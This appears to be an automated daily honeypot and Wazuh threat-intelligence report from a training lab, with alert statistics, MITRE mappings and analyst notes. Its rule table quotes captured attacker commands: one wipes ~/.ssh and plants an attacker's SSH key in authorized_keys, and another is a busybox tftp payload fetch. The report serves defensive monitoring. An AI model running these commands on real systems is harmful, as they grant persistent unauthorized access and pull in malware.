# LearningLab01 Daily Threat Intelligence Report — 2026-10-08

Generated: 2026-10-08T13:15:05.051Z

Report window: 2026-10-07T13:15:05.026Z through 2026-10-08T13:15:05.026Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 164,788 |
| Attack-related alerts | 20,954 |
| Honeypot interactions | 151,709 |
| Authentication failures | 3,792 |
| Authentication successes | 1,065 |
| Critical alerts | 79 |
| High alerts | 985 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 79 critical-severity alerts require priority review.
- 985 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 3.56:1.
- Country attribution currently covers only 25.18% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110204: T-Pot Honeytrap connection from [IP address] to port 5901 (48,864 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 79 | 0.05% |
| High | 985 | 0.60% |
| Medium | 3,716 | 2.26% |
| Low | 160,008 | 97.10% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 3,792
- Authentication successes: 1,065
- Failure-to-success ratio: 3.56:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 12,831 | 61.23% |
| Payload delivery | 12,831 | 61.23% |
| Authentication failure | 3,792 | 18.10% |
| Command execution | 2,826 | 13.49% |
| Reconnaissance | 490 | 2.34% |
| Malware | 71 | 0.34% |
| Network scan | 52 | 0.25% |
| Web attack | 50 | 0.24% |
| SMTP attack | 23 | 0.11% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 41,494 alerts, representing 25.18% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 123,294 | 74.82% | Not geolocated |
| Bulgaria | 39,080 | 23.72% | ████████████████████ |
| Republic of Moldova | 1,954 | 1.19% | █ |
| Germany | 251 | 0.15% | █ |
| United Kingdom | 168 | 0.10% | █ |
| United States | 26 | 0.02% | █ |
| Turkey | 6 | 0.00% | █ |
| Russia | 3 | 0.00% | █ |
| Brazil | 2 | 0.00% | █ |
| British Virgin Islands | 2 | 0.00% | █ |
| Central African Republic | 1 | 0.00% | █ |
| South Africa | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 296 |
| Initial Access | 295 |
| Persistence | 295 |
| Privilege Escalation | 295 |
| Impact | 103 |
| Lateral Movement | 99 |
| Credential Access | 50 |
| Execution | 21 |
| Command and Control | 3 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 295 |
| Stored Data Manipulation | 103 |
| Remote Services | 99 |
| Brute Force | 50 |
| Command and Scripting Interpreter | 21 |
| Ingress Tool Transfer | 3 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110204 | 4 | 48,864 | T-Pot Honeytrap connection from [IP address] to port 5901 | tpot (48,864) |
| 110219 | 4 | 40,996 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - | tpot (40,996) |
| 110213 | 4 | 37,522 | T-Pot RDP connection from [IP address] to port 3389. | tpot (37,522) |
| 110205 | 6 | 12,737 | T-Pot Honeytrap received a payload from [IP address] | tpot (12,737) |
| 110207 | 5 | 10,111 | T-Pot SentryPeer SIP activity from [IP address]:58673, method INVITE | tpot (10,111) |
| 110101 | 3 | 4,705 | Cowrie SSH connection from [IP address]. | tpot (4,705) |
| 110102 | 5 | 3,792 | Cowrie failed login from [IP address] using username root. | tpot (3,792) |
| 110104 | 7 | 2,723 | Cowrie captured a command from [IP address]: system | tpot (2,723) |
| 110103 | 10 | 770 | Cowrie accepted login from [IP address] using username enable. | tpot (770) |
| 110201 | 4 | 568 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (568) |
| 110222 | 9 | 245 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (245) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 196 | PAM: Login session opened. | tpot (194), wazuh (2) |
| 5502 | 3 | 183 | PAM: Login session closed. | tpot (181), wazuh (2) |
| 110221 | 7 | 155 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (155) |
| 110216 | 4 | 120 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (120) |
| 5715 | 3 | 99 | sshd: authentication success. | tpot (98), wazuh (1) |
| 110220 | 8 | 98 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (98) |
| 110212 | 10 | 94 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (94) |
| 550 | 7 | 92 | Integrity checksum changed. | tpot (81), wazuh (11) |
| 110109 | 13 | 79 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (79) |
| 110106 | 10 | 50 | Cowrie detected repeated failed logins from [IP address]. | tpot (50) |
| 110223 | 5 | 50 | T-Pot HoneyAML received  request from  to  on port . | tpot (50) |
| 110105 | 12 | 47 | Cowrie captured a file download from [IP address]. | tpot (47) |
| 110214 | 9 | 47 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (47) |
| 110215 | 4 | 46 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (46) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110217 | 7 | 23 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (23) |
| 110108 | 12 | 21 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (21) |
| 110208 | 7 | 15 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:17123 | tpot (15) |
| 110209 | 5 | 12 | T-Pot Conpot IEC104 event from [IP address]: NEW_CONNECTION | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 2904 | 7 | 7 | Dpkg (Debian Package) half configured. | wazuh (7) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 2902 | 7 | 5 | New dpkg (Debian Package) installed. | wazuh (5) |
| 110107 | 12 | 3 | Cowrie captured a probable payload-retrieval command from [IP address]: busybox tftp -g -r mips -l q [IP address] 2 > /dev/null | tpot (3) |
| 203 | 9 | 3 | Agent event queue is full. Events may be lost. | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 202 | 7 | 2 | Agent event queue is 90% full. | tpot (2) |
| 205 | 3 | 2 | Agent event queue is back to normal load. | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
